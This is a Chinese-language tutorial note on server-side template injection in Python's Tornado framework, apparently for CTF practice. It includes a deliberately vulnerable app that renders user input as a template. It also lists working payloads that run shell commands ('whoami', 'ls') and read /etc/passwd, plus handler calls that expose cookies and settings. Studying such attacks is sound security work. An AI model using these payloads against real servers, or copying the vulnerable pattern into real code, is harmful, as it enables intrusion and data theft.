# Tornado的SSTI

---

Tornado 是一个用 Python 编写的高性能 Web 服务器和 Web 应用框架。它的特点是能够处理大量的并发连接，非常适合于实时 Web 应用程序。



先给一个测试代码

```python
import tornado.ioloop
import tornado.web
from tornado.template import Template

class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        tornado.web.RequestHandler._template_loaders = {}#清空模板引擎

        with open('index.html', 'w') as (f):
            f.write(self.get_argument('name'))

        self.render('index.html')

app = tornado.web.Application(
    [('/', IndexHandler)],
)
app.listen(8888, address="127.0.0.1")
tornado.ioloop.IOLoop.current().start()
```

再有一个index.html文件就行

## 基础验证

```python
{{ 7*7 }}  

# 测试对象访问
{{ handler.settings }}  # 查看应用配置
```

获取一些信息手段

```python
# 读取系统环境变量
{{ ','.join(__import__("os").environ.keys()) }}

# 获取当前工作目录
{{ __import__("os").getcwd() }}
```

### Tornado语法

变量的处理

```python
{{ variable }}                {# 自动HTML转义 #}
{{ escape(variable) }}         {# 显式转义（等同默认行为） #}
{{ raw variable }}            {# 禁用转义输出原始HTML（危险操作） #}
{{ static_url("style.css") }} {# 静态文件URL生成 #}
```

注释的两种方式

```python
{# 单行注释 #}

{# 
  多行
  注释
#}
```

代码方式：

```python
{% set name = "Tornado" %}          {# 变量定义 #}
{% import "module.html" as mod %}   {# 导入模板模块 #}
```

![image-20250203234349134](https://gitee.com/bx33661/image/raw/master/path/image-20250203234349134.png)





**闭合的方式**

```python
{% if condition %}
  条件成立内容
{% elif other_condition %}
  其他条件
{% else %}
  默认内容
{% end %}


{% for item in items %}
  <p>{{ loop.index }} - {{ item }}</p>
  {% break %}          {# 中断循环 #}
  {% continue %}       {# 跳过本次循环 #}
{% empty %}            {# 空列表处理 #}
  <p>无数据</p>
{% end %}
```





## 注入手段

> 学习和收集到的一些思路

常规攻击

```py
{{ __import__("os").system("whoami") }}
{% raw __import__("os").system("whoami") %}
{{eval('__import__("os").popen("ls").read()')}}

#读取文件
{{ __import__("os").popen("cat /etc/passwd").read() }}
```

直接读文件

```python
{% extends "/etc/passwd" %}
{% include "/etc/passwd" %}
```



Tornado函数

```python
{{__import__("os").popen("ls").read()}}
```



利用RequestHandler:

> tornado.web.RequestHandler` 称为 `handler

```python
{{handler.get_argument('yu')}}   //比如传入?yu=123则返回值为123
{{handler.cookies}}  //返回cookie值
{{handler.get_cookie("data")}}  //返回cookie中data的值
{{handler.decode_argument('u0066')}}  //返回f，其中u0066为f的unicode编码
{{handler.get_query_argument('yu')}}  //比如传入?yu=123则返回值为123
{{handler.settings}}  //比如传入application.settings中的值
```



还有一些过滤



> 参考文章：
> https://forum.butian.net/share/2195
>
> https://www.ctfiot.com/102563.html
>
> https://zhuanlan.zhihu.com/p/13246882136